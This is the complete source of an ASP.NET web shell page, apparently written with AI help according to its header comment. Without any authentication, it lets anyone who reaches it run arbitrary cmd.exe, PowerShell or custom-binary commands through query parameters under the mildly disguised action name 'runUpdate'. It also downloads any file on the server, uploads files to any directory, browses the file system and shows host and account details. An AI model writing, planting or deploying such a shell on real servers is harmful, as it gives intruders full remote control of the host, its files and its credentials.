<%@ Page Language="C#" %>
<!DOCTYPE html>
<!-- <3 @jakobfriedl @claude @glm vibecoded payload -->
<html>
<head>
    <title>aspxweb</title>
    <style>
        body { font-family: Arial, sans-serif; margin: 40px; }
        .proof { background: #e8f5e9; padding: 20px; border-left: 4px solid #4caf50; margin: 10px 0; }
        .info { background: #e3f2fd; padding: 20px; border-left: 4px solid #2196f3; margin: 10px 0; }
        .button { background: #4caf50; color: white; padding: 15px 32px; text-align: center; 
                  text-decoration: none; display: inline-block; font-size: 16px; margin: 10px 0;
                  cursor: pointer; border: none; border-radius: 4px; }
        .button:hover { background: #45a049; }
        .result { background: #fff3cd; padding: 15px; border-left: 4px solid #ffc107; margin: 10px 0; }
        .error { background: #f8d7da; padding: 15px; border-left: 4px solid #dc3545; margin: 10px 0; }
        .cmd-row { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; margin-bottom: 8px; }
        .cmd-row input[type=text] { flex: 1; min-width: 200px; padding: 8px; font-family: monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; }
        .cmd-row select { padding: 8px; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; }
        .cmd-row input[type=file] { flex: 1; min-width: 200px; padding: 6px; font-family: monospace;
                                    font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        #custom-binary-row { display: none; margin-bottom: 8px; }
        #custom-binary-row input { width: 100%; padding: 8px; font-family: monospace; font-size: 14px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        pre { background: #111; color: #39ff6e; padding: 16px; overflow-x: auto; font-size: 13px; border-radius: 4px; white-space: pre-wrap; word-break: break-all; }
    </style>
</head>
<body>
    <%
        string message     = "";
        string messageType = "";
        string output      = "";

        System.Collections.Specialized.NameValueCollection input =
            (Request.HttpMethod == "POST") ? Request.Form : Request.QueryString;
        // listing dir, resolved once up front — form, listing and upload all use it
        string listDir = input["dir"];
        if (string.IsNullOrEmpty(listDir)) {
            listDir = Server.MapPath(".");
        }
        string action = input["action"] ?? "";

        // download — stream the raw file as an attachment and abort, the page never renders
        if (action == "download")
        {
            string dlPath = input["file"] ?? "";
            try
            {
                if (dlPath.Length == 0 || !System.IO.File.Exists(dlPath)) {
                    throw new System.IO.FileNotFoundException("no such file", dlPath);
                }
                Response.Clear();
                Response.ClearHeaders();
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition",
                    "attachment; filename=\"" + System.IO.Path.GetFileName(dlPath).Replace("\"", "_") + "\"");
                Response.AddHeader("Content-Length", new System.IO.FileInfo(dlPath).Length.ToString());
                Response.TransmitFile(dlPath);
                Response.End();
            }
            catch (System.Threading.ThreadAbortException) { throw; }
            catch (Exception ex)
            {
                message     = "Download failed: " + ex.Message;
                messageType = "error";
            }
        }

        // upload — multipart POST, saves the file into listDir, page re-renders with the status
        if (action == "upload")
        {
            try
            {
                if (Request.Files.Count == 0) {
                    throw new Exception("no file part in the request — must be multipart/form-data");
                }
                System.Web.HttpPostedFile up = Request.Files[0];
                if (up.ContentLength == 0) {
                    throw new Exception("empty file");
                }
                string destPath = System.IO.Path.Combine(listDir, System.IO.Path.GetFileName(up.FileName));
                up.SaveAs(destPath);
                message     = "Uploaded " + up.ContentLength + " bytes to " + destPath;
                messageType = "result";
            }
            catch (Exception ex)
            {
                message     = "Upload failed: " + ex.Message;
                messageType = "error";
            }
        }

        if (action == "runUpdate")
        {
            try
            {
                string mode    = input["mode"] ?? "cmd";
                string cmdArgs = input["cmdargs"] ?? "";
                string customBin = input["custombin"] ?? "";

                string binary = "";
                string args   = "";

                if (mode == "cmd") {
                    binary = "cmd.exe";
                    args   = "/c " + cmdArgs;
                } else if (mode == "ps") {
                    binary = "powershell.exe";
                    args   = "-NoP -NonI -C \"" + cmdArgs.Replace("\"", "\\\"") + "\"";
                } else {
                    // custom: binary is whatever they typed, args is the args box
                    binary = customBin;
                    args   = cmdArgs;
                }

                System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
                psi.FileName               = binary;
                psi.Arguments              = args;
                psi.UseShellExecute        = false;
                psi.CreateNoWindow         = true;
                psi.RedirectStandardOutput = true;
                psi.RedirectStandardError  = true;

                System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi);
                output = process.StandardOutput.ReadToEnd() + process.StandardError.ReadToEnd();
                process.WaitForExit();

                message     = "Exit code: " + process.ExitCode + " &nbsp;|&nbsp; PID was: " + process.Id;
                messageType = "result";
            }
            catch (Exception ex)
            {
                message     = "Error: " + ex.Message;
                messageType = "error";
            }
        }
    %>

    <div class="proof">
        <form method="get" id="execform">
            <input type="hidden" name="action" value="runUpdate" />
            <input type="hidden" name="dir" value="<%= System.Web.HttpUtility.HtmlEncode(listDir) %>" />
            <div class="cmd-row">
                <select name="mode" id="mode-sel" onchange="toggleCustom(this.value)">
                    <option value="cmd">cmd.exe</option>
                    <option value="ps">powershell.exe</option>
                    <option value="custom">custom binary</option>
                </select>
                <input type="text" name="cmdargs" placeholder="arguments / command" autocomplete="off" spellcheck="false" autofocus />
                <button type="submit" class="button" style="padding:8px 20px;font-size:14px;margin:0">Run</button>
            </div>
            <div id="custom-binary-row">
                <input type="text" name="custombin" placeholder="full path to binary e.g. D:\...\somebin.exe" autocomplete="off" spellcheck="false" />
            </div>
        </form>

        <% if (!string.IsNullOrEmpty(message)) { %>
            <div class="<%= messageType %>"><strong><%= message %></strong></div>
        <% } %>
        <% if (!string.IsNullOrEmpty(output)) { %>
            <pre id="command_result"><%= System.Web.HttpUtility.HtmlEncode(output) %></pre>
        <% } %>
    </div>

    <div class="proof">
        <p><strong>Current Server Time:</strong> <%= DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") %></p>
        <p><strong>Server Time (UTC):</strong> <%= DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss") %></p>
        <p><strong>Random Number Generated:</strong> <%= new Random().Next(1000, 9999) %></p>
    </div>

    <div class="info">
        <p><strong>Server Name:</strong> <%= Environment.MachineName %></p>
        <p><strong>OS Version:</strong> <%= Environment.OSVersion %></p>
        <p><strong>ASP.NET Version:</strong> <%= Environment.Version %></p>
        <p><strong>Current Directory:</strong> <%= Environment.CurrentDirectory %></p>
    </div>

    <div class="info">
        <h2>User Information</h2>
        <p><strong>Current User:</strong> <%= Environment.UserName %></p>
        <p><strong>User Domain:</strong> <%= Environment.UserDomainName %></p>
        <p><strong>Full Identity:</strong> <%= System.Security.Principal.WindowsIdentity.GetCurrent().Name %></p>
    </div>

    <div class="info">
        <%
            try
            {
        %>
        <h3>Files in <%= System.Web.HttpUtility.HtmlEncode(listDir) %>:</h3>
        <ul>
        <% foreach (string file in System.IO.Directory.GetFiles(listDir)) { %>
            <li><a href="?action=download&amp;file=<%= System.Uri.EscapeDataString(file) %>" target="_blank"><%= System.Web.HttpUtility.HtmlEncode(System.IO.Path.GetFileName(file)) %></a> (<%= new System.IO.FileInfo(file).Length %> bytes)</li>
        <% } %>
        </ul>
        <h3>Subdirectories:</h3>
        <ul>
        <%
            System.IO.DirectoryInfo up = System.IO.Directory.GetParent(listDir);
            if (up != null) { %>
            <li><a href="?dir=<%= System.Uri.EscapeDataString(up.FullName) %>">[.. one level up]</a></li>
        <%  } %>
        <% foreach (string dir in System.IO.Directory.GetDirectories(listDir)) { %>
            <li><a href="?dir=<%= System.Uri.EscapeDataString(dir) %>"><%= System.Web.HttpUtility.HtmlEncode(System.IO.Path.GetFileName(dir)) %></a></li>
        <% } %>
        </ul>
        <%
            }
            catch (Exception ex)
            {
        %>
        <p><strong>Listing failed:</strong> <%= System.Web.HttpUtility.HtmlEncode(ex.Message) %></p>
        <%
            }
        %>

        <h3>Upload to <%= System.Web.HttpUtility.HtmlEncode(listDir) %>:</h3>
        <form method="post" enctype="multipart/form-data" id="uploadform">
            <input type="hidden" name="action" value="upload" />
            <input type="hidden" name="dir" value="<%= System.Web.HttpUtility.HtmlEncode(listDir) %>" />
            <div class="cmd-row">
                <input type="file" name="upfile" required />
                <button type="submit" class="button" style="padding:8px 20px;font-size:14px;margin:0">Upload</button>
            </div>
        </form>
    </div>



    <script>
    function toggleCustom(val) {
        document.getElementById('custom-binary-row').style.display = val === 'custom' ? 'block' : 'none';
    }
    document.getElementById('execform').addEventListener('keydown', function(e) {
        if (e.key === 'Enter') { e.preventDefault(); this.submit(); }
    });
    </script>
</body>
</html>

